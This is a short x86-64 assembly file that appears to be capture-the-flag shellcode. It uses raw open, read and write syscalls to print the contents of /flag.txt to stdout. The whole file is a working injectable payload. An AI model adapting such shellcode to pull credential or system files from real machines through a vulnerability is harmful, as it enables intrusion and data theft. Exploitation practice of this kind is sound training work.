section .text
    global _start

_start:
;rd_only
    xor     rdx, rdx
    xor     rax, rax
    xor     rsi, rsi
    mov     qword rbx, 'lollollt'
    shr     rbx, 0x38
    push    rbx
    mov     qword rbx, '/flag.tx'
    push    rbx
    ;filename now in rdi
    mov     rdi, rsp
    mov     al, 0x2
    syscall
    mov     rdi, rax
    xor     rax, rax
    mov     rsi, rsp
    mov     rdx, 0x100
    syscall
    mov     rdx, rax
    mov     rax, 1
    ;stdout
    mov     rdi, 1
    syscall
